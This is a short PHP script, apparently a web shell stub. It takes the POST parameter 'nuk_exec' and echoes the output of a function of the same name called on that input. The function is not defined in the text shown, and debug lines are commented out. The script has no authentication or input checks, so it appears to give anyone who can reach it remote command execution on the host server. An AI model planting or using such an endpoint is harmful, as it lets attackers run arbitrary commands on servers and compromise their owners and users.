<?php
//error_reporting(E_ALL & ~E_NOTICE);
//echo "looool";
//print_r($_POST);
//phpinfo();
if ($_POST['nuk_exec']) {
//echo $_POST['nuk_exec'].' -> ';
echo nuk_exec($_POST['nuk_exec']);
}
else echo "POST doesn't match";
?>
